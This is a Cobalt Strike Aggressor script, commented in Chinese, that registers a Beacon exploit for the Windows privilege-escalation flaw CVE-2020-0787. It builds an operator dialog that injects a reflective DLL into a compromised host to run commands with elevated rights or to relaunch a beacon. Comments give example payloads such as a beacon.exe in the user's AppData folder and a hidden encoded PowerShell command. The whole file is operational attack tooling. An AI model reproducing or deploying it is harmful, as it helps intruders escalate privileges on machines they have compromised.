sub getnow {
	return (formatDate("yyyy/MM/dd HH:mm:ss"));
}
sub CVE_2020_0787 {
		#返回信标 cmd /c C:\\Users\\admin\\AppData\\Local\\beacon.exe  OR cmd /c C://Users//admin//AppData//Local//beacon.exe
		# powershell nop -w hidden -encodedcommand  xxx
		#执行命令 cmd /c whoami
		$Dialog = dialog("CVE_2020_0787-命令执行",%(program => "cmd.exe" , parameters => "/c whoami" , bid => $1 , listener => $2),lambda({
			#$1 是dialog对象，所以这里不能用$1接收参数，用$3
			local('$program $parameters $Action $user $bid $arch $dll $cmdline');
			$bid = $3['bid'];
			$program = $3['program'];
			$listener = $3['listener'];
			$parameters = $3['parameters'];
			$Action = $3['Action'];
			blog($bid, "-------".getnow()."-------");
			if($Action eq "命令执行"){
				$cmdline  = "1|".$program."|".$parameters. " \> \\\\\\\\.\\\\pipe\\\\8e8988b257e9dd2ea44ff03d44d26467b7c9ec16";
			}else if($Action eq "返回信标"){
				$cmdline  = "2|".$program."|".$parameters;
			}
				$cmdline = replace($cmdline,":\/",":\/\/");
				blog($bid, "执行: \c4  $cmdline \o");
				btask($bid, "Task Beacon to run " . listener_describe($listener) . " via CVE-2020-0787"); #KB4551762
				$arch = "x86";
				$dll = getFileProper(script_resource("Release\\Win32\\"), "reflective_dll.dll"); 
				bdllspawn!($bid, $dll,$cmdline, "Elevation of local privileges", 5000);
		},$1 => $1 ));
		dialog_description($Dialog, "命令执行：可回显，执行的命令需要可以回显，否则会出错。返回信标用于没有回显的执行方式，注意文件路径使用C://1.exe或C:\\1.exe");
		drow_text($Dialog, "program", "执行程序:");
		drow_text($Dialog, "parameters", "执行参数:");
		drow_combobox($Dialog, "Action", "Action: ", @("命令执行","返回信标"));
		dbutton_action($Dialog, "Execute");
		dialog_show($Dialog);
	}
beacon_exploit_register("CVE_2020_0787", "CVE_2020_0787", &CVE_2020_0787);